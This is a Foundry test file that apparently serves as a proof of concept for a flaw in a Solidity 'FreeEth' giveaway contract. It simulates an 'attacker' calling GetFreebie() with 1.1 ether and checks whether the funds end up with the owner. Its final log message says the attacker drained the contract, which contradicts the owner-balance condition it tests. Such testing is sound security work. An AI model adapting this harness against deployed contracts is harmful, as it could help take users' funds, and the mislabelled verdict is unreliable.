// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol";

contract FreeEthTest is Test {
    FreeEth public freeEth;
    address public owner = address(0x123);
    address public attacker = address(0xBAD);
    uint256 public initialContractFunding = 1 ether;
    uint256 public attackerValue = 1.1 ether;

    function setUp() public {
        // Deploy by the owner
        vm.prank(owner);
        freeEth = new FreeEth();
        
        // Fund contract balance to simulate existing ETH
        vm.deal(address(freeEth), initialContractFunding);
        // Fund attacker with more than 1 ETH
        vm.deal(attacker, attackerValue);
    }

    function testGetFreebieDrainsContract() public {
        // Pre-trigger state recording
        console2.log("--- BEFORE-Trigger State ---");
        uint256 initialContractBalance = address(freeEth).balance;
        uint256 ownerBalanceBefore = owner.balance;
        uint256 totalFreebiesBefore = freeEth.totalFreebies();
        uint256 attackerFreebieClaimsBefore = freeEth.freebieClaims(attacker);
        console2.log("Total freebies BEFORE:", totalFreebiesBefore);
        console2.log("Attackers claims BEFORE:", attackerFreebieClaimsBefore);
        console2.log("Contract balance BEFORE:", initialContractBalance);
        console2.log("Owner balance BEFORE:", ownerBalanceBefore);

        console2.log("--- Trigger GetFreebie ---");
        // Simulate attacker calling GetFreebie with >1 ether
        vm.prank(attacker);
        (bool success, ) = address(freeEth).call{value: attackerValue}(abi.encodeWithSignature("GetFreebie()"));
        require(success, "Call to GetFreebie failed");

        // Post-trigger state recording
        console2.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(freeEth).balance;
        uint256 ownerBalanceAfter = owner.balance;
        uint256 totalFreebiesAfter = freeEth.totalFreebies();
        uint256 attackerFreebieClaimsAfter = freeEth.freebieClaims(attacker);
        console2.log("Total freebies AFTER:", totalFreebiesAfter);
        console2.log("Attackers claims AFTER:", attackerFreebieClaimsAfter);
        console2.log("Contract balance AFTER:", contractBalanceAfter);
        console2.log("Owner balance AFTER:", ownerBalanceAfter);

        // State change verification
        console2.log("--- State Change Comparison ---");
        bool totalFreebiesIncreased = totalFreebiesAfter > totalFreebiesBefore;
        bool attackerClaimsIncreased = attackerFreebieClaimsAfter > attackerFreebieClaimsBefore;
        console2.log("Total freebies increased:", totalFreebiesIncreased ? "YES" : "NO");
        console2.log("Attacker claim counts increased:", attackerClaimsIncreased ? "YES" : "NO");

        // Final vulnerability verdict
        if (contractBalanceAfter == 0 && 
            totalFreebiesIncreased && 
            attackerClaimsIncreased &&
            ownerBalanceAfter == ownerBalanceBefore + initialContractBalance + attackerValue) {
            console2.log("Vulnerability Exists: Attacker drained contract and incremented claim counts");
        } else {
            console2.log("Vulnerability not Exist: Contract state changes not as expected");
        }
    }
}